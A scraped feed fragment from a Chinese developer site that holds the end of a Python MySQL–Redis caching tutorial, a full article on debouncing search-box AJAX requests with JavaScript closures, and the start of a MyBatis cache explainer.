                redis_client.setex(cache_key, CACHE_TTL, json.dumps(user))
                <span class="hljs-keyword">return</span> user
            <span class="hljs-keyword">else</span>:
                redis_client.setex(cache_key, <span class="hljs-number">60</span>, <span class="hljs-string">""</span>)
                <span class="hljs-keyword">return</span> <span class="hljs-literal">None</span>
        <span class="hljs-keyword">finally</span>:
            <span class="hljs-comment"># 释放锁（Lua 脚本确保安全）</span>
            unlock_script = redis_client.register_script(<span class="hljs-string">"""
            if redis.call("GET", KEYS[1]) == ARGV[1] then
                return redis.call("DEL", KEYS[1])
            else
                return 0
            end
            """</span>)
            unlock_script(keys=[lock_key], args=[lock_value])
    <span class="hljs-keyword">else</span>:
        <span class="hljs-comment"># 未获得锁，短暂等待后重试（或直接返回错误）</span>
        time.sleep(<span class="hljs-number">0.01</span>)
        <span class="hljs-keyword">return</span> get_user_safe(user_id)  <span class="hljs-comment"># 递归重试（生产环境建议限制重试次数）</span>
</code></pre>
<hr/>
<h2 data-id="heading-8">✅ 三、完整使用流程示例</h2>
<pre><code class="hljs language-ini" lang="ini">if <span class="hljs-attr">__name__</span> == <span class="hljs-string">"__main__"</span>:
    <span class="hljs-attr">user_id</span> = <span class="hljs-number">123</span>
    
    <span class="hljs-comment"># 首次查询：缓存未命中 → 查 DB → 写缓存</span>
    <span class="hljs-attr">user</span> = get_user_by_id(user_id)
    print("User:", user)
    
    <span class="hljs-comment"># 第二次查询：命中缓存</span>
    <span class="hljs-attr">user</span> = get_user_by_id(user_id)
    print("User (cached):", user)
    
    <span class="hljs-comment"># 更新用户</span>
    update_user(user_id, "New Name", "new@example.com")
    
    <span class="hljs-comment"># 再次查询：缓存已失效，重新加载</span>
    <span class="hljs-attr">user</span> = get_user_by_id(user_id)
    print("Updated user:", user)
</code></pre>
<hr/>
<h2 data-id="heading-9">✅ 四、高级技巧与注意事项</h2>
<h3 data-id="heading-10">1. <strong>缓存空值防穿透</strong></h3>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># 如上文所示，对 DB 返回 None 的情况也缓存空字符串（TTL 较短）</span>
</code></pre>
<h3 data-id="heading-11">2. <strong>设置随机过期时间防雪崩</strong></h3>
<pre><code class="hljs language-ini" lang="ini">import random
<span class="hljs-attr">base_ttl</span> = <span class="hljs-number">300</span>
<span class="hljs-attr">random_ttl</span> = base_ttl + random.randint(<span class="hljs-number">0</span>, <span class="hljs-number">60</span>)  <span class="hljs-comment"># 300~360 秒</span>
redis_client.setex(key, random_ttl, value)
</code></pre>
<h3 data-id="heading-12">3. <strong>使用 Pipeline 批量操作</strong></h3>
<pre><code class="hljs language-scss" lang="scss">with redis_client<span class="hljs-selector-class">.pipeline</span>() as pipe:
    pipe.<span class="hljs-built_in">setex</span>(<span class="hljs-string">"user:1"</span>, <span class="hljs-number">300</span>, json.<span class="hljs-built_in">dumps</span>(user1))
    pipe.<span class="hljs-built_in">setex</span>(<span class="hljs-string">"user:2"</span>, <span class="hljs-number">300</span>, json.<span class="hljs-built_in">dumps</span>(user2))
    pipe.<span class="hljs-built_in">execute</span>()
</code></pre>
<h3 data-id="heading-13">4. <strong>监控缓存命中率</strong></h3>
<pre><code class="hljs language-python" lang="python"><span class="hljs-comment"># 在 get_user 中增加指标</span>
total_requests += <span class="hljs-number">1</span>
<span class="hljs-keyword">if</span> cached:
    cache_hits += <span class="hljs-number">1</span>
<span class="hljs-built_in">print</span>(<span class="hljs-string">f"Hit rate: <span class="hljs-subst">{cache_hits/total_requests:<span class="hljs-number">.2</span>%}</span>"</span>)
</code></pre>
<h3 data-id="heading-14">5. <strong>数据一致性保障</strong></h3>
<ul>
<li><strong>最终一致性</strong>：接受短暂不一致（适用于大多数场景）</li>
<li><strong>强一致性</strong>：写操作时加全局锁（性能差，慎用）</li>
<li><strong>延迟双删</strong>（不推荐）：先删缓存 → 更新 DB → 延迟再删缓存（仍有窗口期）</li>
</ul>
<hr/>
<h2 data-id="heading-15">✅ 五、总结：最佳实践清单</h2>









































<table><thead><tr><th>项目</th><th>建议</th></tr></thead><tbody><tr><td><strong>读流程</strong></td><td>先 Redis，后 MySQL</td></tr><tr><td><strong>写流程</strong></td><td>先 MySQL，后删 Redis</td></tr><tr><td><strong>缓存键设计</strong></td><td>语义清晰，如 <code>user:{id}</code>、<code>product:{sku}</code></td></tr><tr><td><strong>空值处理</strong></td><td>缓存空结果（短 TTL）</td></tr><tr><td><strong>过期时间</strong></td><td>设置随机值防雪崩</td></tr><tr><td><strong>热点 Key</strong></td><td>用分布式锁防击穿</td></tr><tr><td><strong>序列化</strong></td><td>用 JSON（兼容性好），避免 pickle（安全风险）</td></tr><tr><td><strong>连接管理</strong></td><td>Redis 用连接池，MySQL 用上下文管理器</td></tr></tbody></table>
<blockquote>
<p>💡 <strong>记住</strong>：<br/>
<strong>Redis 是加速器，不是数据库。所有关键数据必须以 MySQL 为准。</strong></p>
</blockquote>
<hr/>
<p>通过以上范例，你可以安全、高效地在 Python 项目中结合 MySQL 和 Redis。如果需要 <strong>Django / Flask 集成示例</strong> 或 <strong>使用连接池/异步版本（aioredis）</strong> ，欢迎继续提问！</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[防抖（Debounce）实战解析：如何用闭包优化频繁 AJAX 请求，提升用户体验]]></title>    <link>https://juejin.cn/post/7590054976489422888</link>    <guid>https://juejin.cn/post/7590054976489422888</guid>    <pubDate>2026-01-02T08:16:37.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7590054976489422888" data-draft-id="7590104561475403828" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="防抖（Debounce）实战解析：如何用闭包优化频繁 AJAX 请求，提升用户体验"/> <meta itemprop="keywords" content="前端"/> <meta itemprop="datePublished" content="2026-01-02T08:16:37.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="无敌的拖拉斯旋风"/> <meta itemprop="url" content="https://juejin.cn/user/951508170179208"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            防抖（Debounce）实战解析：如何用闭包优化频繁 AJAX 请求，提升用户体验
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/951508170179208/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    无敌的拖拉斯旋风
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-02T08:16:37.000Z" title="Fri Jan 02 2026 08:16:37 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-02
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读5分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>在现代 Web 开发中，用户交互越来越丰富，但随之而来的性能问题也日益突出。一个典型场景是：<strong>搜索框实时建议功能</strong>。当用户在输入框中快速打字时，如果每按一次键就立即向服务器发送一次 AJAX 请求，不仅会造成大量无效网络开销，还可能导致页面卡顿、响应错乱，甚至压垮后端服务。本文将以“百度搜索建议”为例，通过对比<strong>未防抖</strong>与<strong>防抖</strong>两种实现方式，深入浅出地讲解防抖技术的原理、实现及其带来的显著优势。</p>
<hr/>
<h2 data-id="heading-0">一、问题引入：不防抖的“蛮力请求”有多糟糕？</h2>
<p>假设我们正在开发一个类似百度搜索的自动补全功能。用户在输入框中输入关键词，前端实时将内容发送到服务器，获取匹配建议并展示。</p>
<h3 data-id="heading-1">❌ 不防抖的实现（反面教材）</h3>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">const</span> input = <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">getElementById</span>(<span class="hljs-string">'search'</span>);
input.<span class="hljs-title function_">addEventListener</span>(<span class="hljs-string">'input'</span>, <span class="hljs-keyword">function</span>(<span class="hljs-params">e</span>) {
    <span class="hljs-title function_">ajax</span>(e.<span class="hljs-property">target</span>.<span class="hljs-property">value</span>); <span class="hljs-comment">// 每次输入都立刻发请求</span>
});

<span class="hljs-keyword">function</span> <span class="hljs-title function_">ajax</span>(<span class="hljs-params">query</span>) {
    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'发送请求:'</span>, query);
    <span class="hljs-comment">// 实际项目中这里是 fetch 或 XMLHttpRequest</span>
}
</code></pre>
<p><strong>用户输入 “javascript” 的过程：</strong></p>
<p>表格</p>








































<table><thead><tr><th>输入步骤</th><th>触发次数</th><th>发送的请求</th></tr></thead><tbody><tr><td>j</td><td>1</td><td>"j"</td></tr><tr><td>ja</td><td>2</td><td>"ja"</td></tr><tr><td>jav</td><td>3</td><td>"jav"</td></tr><tr><td>java</td><td>4</td><td>"java"</td></tr><tr><td>…</td><td>…</td><td>…</td></tr><tr><td>javascript</td><td>10</td><td>"javascript"</td></tr></tbody></table>
<p><strong>后果分析：</strong></p>
<ul>
<li><strong>资源浪费</strong>：前9次请求几乎无意义（用户还没输完），却消耗了带宽、CPU 和服务器连接。</li>
<li><strong>响应错乱</strong>：如果“j”的响应比“javascript”晚到，页面会先显示“j”的结果，再跳变到最终结果，体验极差。</li>
<li><strong>页面卡顿</strong>：高频 DOM 操作 + 网络回调，容易导致主线程阻塞，输入框变得“卡手”。</li>
</ul>
<p>这就是典型的“执行太密集、任务太复杂”问题——<strong>事件触发频率远高于实际需求</strong>。</p>
<hr/>
<h2 data-id="heading-2">二、解决方案：用防抖（Debounce）优雅降频</h2>
<h3 data-id="heading-3">✅ 什么是防抖？</h3>
<blockquote>
<p><strong>防抖（Debounce）</strong>  是一种函数优化技术：<strong>在事件被频繁触发时，仅在最后一次触发后等待指定时间，才真正执行函数。</strong></p>
</blockquote>
<p>通俗理解：</p>
<blockquote>
<p>用户打字时，我不急着查；等他<strong>停手500毫秒</strong>，我才认为他“打完了”，这时才发请求。</p>
</blockquote>
<h3 data-id="heading-4">🔧 防抖的核心实现（基于闭包）</h3>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">function</span> <span class="hljs-title function_">debounce</span>(<span class="hljs-params">fn, delay</span>) {
    <span class="hljs-keyword">let</span> timer; <span class="hljs-comment">// 闭包变量：保存定时器ID</span>
    <span class="hljs-keyword">return</span> <span class="hljs-keyword">function</span>(<span class="hljs-params">...args</span>) {
        <span class="hljs-keyword">const</span> context = <span class="hljs-variable language_">this</span>;
        <span class="hljs-built_in">clearTimeout</span>(timer); <span class="hljs-comment">// 清除上一次的定时器</span>
        timer = <span class="hljs-built_in">setTimeout</span>(<span class="hljs-function">() =&gt;</span> {
            fn.<span class="hljs-title function_">apply</span>(context, args); <span class="hljs-comment">// 延迟执行，并保持this和参数</span>
        }, delay);
    };
}
</code></pre>
<p><strong>关键点解析：</strong></p>
<ul>
<li><strong>闭包作用</strong>：<code>timer</code> 被内部函数引用，不会被垃圾回收，可跨多次调用共享。</li>
<li><strong>清除旧定时器</strong>：每次触发都重置倒计时，确保只执行“最后一次”。</li>
<li><strong>保留上下文</strong>：通过 <code>apply</code> 保证原函数的 <code>this</code> 和参数正确传递。</li>
</ul>
<h3 data-id="heading-5">✅ 防抖后的使用</h3>
<pre><code class="hljs language-ini" lang="ini">const <span class="hljs-attr">debouncedAjax</span> = debounce(ajax, <span class="hljs-number">500</span>)<span class="hljs-comment">;</span>
input.addEventListener('input', function(e) {
    debouncedAjax(e.target.value)<span class="hljs-comment">;</span>
})<span class="hljs-comment">;</span>
</code></pre>
<p><strong>用户输入 “javascript” 的效果：</strong></p>
<ul>
<li>快速打完10个字母 → <strong>只触发1次请求</strong>（“javascript”）</li>
<li>中途停顿超过500ms → 触发当前值的请求（如打到“java”停住）</li>
</ul>
<hr/>
<h2 data-id="heading-6">三、对比实验：防抖 vs 不防抖</h2>
<p>我们在 HTML 中放置两个输入框：</p>
<pre><code class="hljs language-ini" lang="ini">&lt;input <span class="hljs-attr">id</span>=<span class="hljs-string">"undebounce"</span> placeholder=<span class="hljs-string">"不防抖（危险！）"</span>&gt;
&lt;input <span class="hljs-attr">id</span>=<span class="hljs-string">"debounce"</span> placeholder=<span class="hljs-string">"防抖（推荐）"</span>&gt;
</code></pre>
<p>绑定不同逻辑：</p>
<pre><code class="hljs language-ini" lang="ini">// 不防抖：每输入一个字符就请求
undebounce.addEventListener('input', <span class="hljs-attr">e</span> =&gt; ajax(e.target.value))<span class="hljs-comment">;</span>

// 防抖：500ms 内只执行最后一次
debounce.addEventListener('input', <span class="hljs-attr">e</span> =&gt; debouncedAjax(e.target.value))<span class="hljs-comment">;</span>
</code></pre>
<p><strong>打开浏览器控制台，分别快速输入 “react”：</strong></p>
<ul>
<li><strong>不防抖输入框</strong>：控制台瞬间打印 5 条日志（r, re, rea, reac, react）</li>
<li><strong>防抖输入框</strong>：控制台仅在你停止输入后 0.5 秒打印 1 条日志（react）</li>
</ul>
<p><strong>用户体验差异：</strong></p>
<ul>
<li>不防抖：页面可能闪烁、卡顿，建议列表频繁跳动。</li>
<li>防抖：输入流畅，结果稳定，资源消耗降低 80% 以上。</li>
</ul>
<hr/>
<h2 data-id="heading-7">四、为什么防抖能解决性能问题？</h2>
<ol>
<li><strong>减少无效请求</strong><br/>
用户输入过程中产生的中间状态（如“j”、“ja”）通常无需处理，防抖直接忽略它们。</li>
<li><strong>避免竞态条件（Race Condition）</strong><br/>
后发的请求覆盖先发的结果，确保 UI 始终显示最新、最完整的查询结果。</li>
<li><strong>降低服务器压力</strong><br/>
假设每天有 10 万用户使用搜索，平均每人输入 10 次，不防抖产生 100 万请求；防抖后可能仅 10 万请求，节省 90% 计算资源。</li>
<li><strong>提升前端性能</strong><br/>
减少 JavaScript 执行、DOM 更新和网络回调的频率，主线程更“轻盈”，页面更流畅。</li>
</ol>
<hr/>
<h2 data-id="heading-8">五、防抖的适用场景</h2>
<p>表格</p>

























<table><thead><tr><th>场景</th><th>说明</th></tr></thead><tbody><tr><td><strong>搜索框建议</strong></td><td>用户输入时延迟请求，等输入稳定后再查</td></tr><tr><td><strong>窗口 resize</strong></td><td>防止调整窗口大小时频繁触发布局计算</td></tr><tr><td><strong>表单提交</strong></td><td>防止用户狂点“提交”按钮导致重复提交</td></tr><tr><td><strong>按钮点击</strong></td><td>如“点赞”功能，避免快速连点</td></tr></tbody></table>
<blockquote>
<p>⚠️ 注意：<strong>滚动加载（scroll）更适合用节流（Throttle）</strong> ，因为用户持续滚动时仍需定期触发（如每 200ms 检查是否到底部），而防抖会在滚动结束才触发，可能错过加载时机。</p>
</blockquote>
<hr/>
<h2 data-id="heading-9">六、总结：防抖是前端性能优化的基石</h2>
<p>通过本文的对比实验，我们可以清晰看到：<strong>不加控制的事件监听是性能杀手，而防抖则是优雅的“减速阀”</strong> 。它利用闭包保存状态，通过定时器智能合并高频操作，在<strong>不牺牲用户体验的前提下</strong>，大幅降低系统开销。</p>
<p>在实际项目中，建议：</p>
<ul>
<li>对 <code>input</code>、<code>keyup</code>、<code>resize</code> 等高频事件<strong>默认使用防抖或节流</strong></li>
<li>使用成熟的工具库（如 Lodash 的 <code>_.debounce</code>）避免手写 bug</li>
<li>根据业务调整延迟时间（搜索建议常用 300–500ms）</li>
</ul>
<p>记住：<strong>好的前端工程师，不仅要让功能跑起来，更要让它跑得稳、跑得快、跑得省。</strong>  而防抖，正是你工具箱中不可或缺的一把利器。</p>
<blockquote>
<p>🌟 <strong>小提示</strong>：下次当你看到百度搜索框在你打字时不急不躁、等你停手才给出建议时，就知道——背后一定有防抖在默默守护性能！</p>
</blockquote></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[MyBatis缓存模块详解]]></title>    <link>https://juejin.cn/post/7590011643296841766</link>    <guid>https://juejin.cn/post/7590011643296841766</guid>    <pubDate>2026-01-02T08:24:41.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7590011643296841766" data-draft-id="7590021144779653166" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="MyBatis缓存模块详解"/> <meta itemprop="keywords" content="MyBatis"/> <meta itemprop="datePublished" content="2026-01-02T08:24:41.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="雨中飘荡的记忆"/> <meta itemprop="url" content="https://juejin.cn/user/694547077666606"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            MyBatis缓存模块详解
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/694547077666606/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    雨中飘荡的记忆
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-02T08:24:41.000Z" title="Fri Jan 02 2026 08:24:41 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-02
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读8分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><blockquote>
<p>深入剖析MyBatis缓存机制，从架构设计到实战应用，助你全面掌握缓存优化</p>
</blockquote>
<hr/>
<h2 data-id="heading-0">一、初识MyBatis缓存</h2>
<p>在正式开始之前，让我们先来了解MyBatis的整体架构。MyBatis采用分层设计，而缓存模块作为基础支撑层的核心组件，承担着提升查询性能的重要使命。</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/3bdfab9b7c014c36acedf80a93e481c5~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6Zuo5Lit6aOY6I2h55qE6K6w5b-G:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767947081&amp;x-signature=40ZpXnOHN21nwfaO0at88ZiCpc4%3D" alt="" loading="lazy"/></p>
<h2 data-id="heading-1">缓存的价值何在？</h2>
<p>想象这样一个场景：你的系统每秒需要查询1000次用户信息。</p>
<p><strong>无缓存时：</strong> 1000次数据库查询/秒</p>
<p><strong>有缓存时：</strong> 1次数据库查询 + 999次内存读取/秒</p>
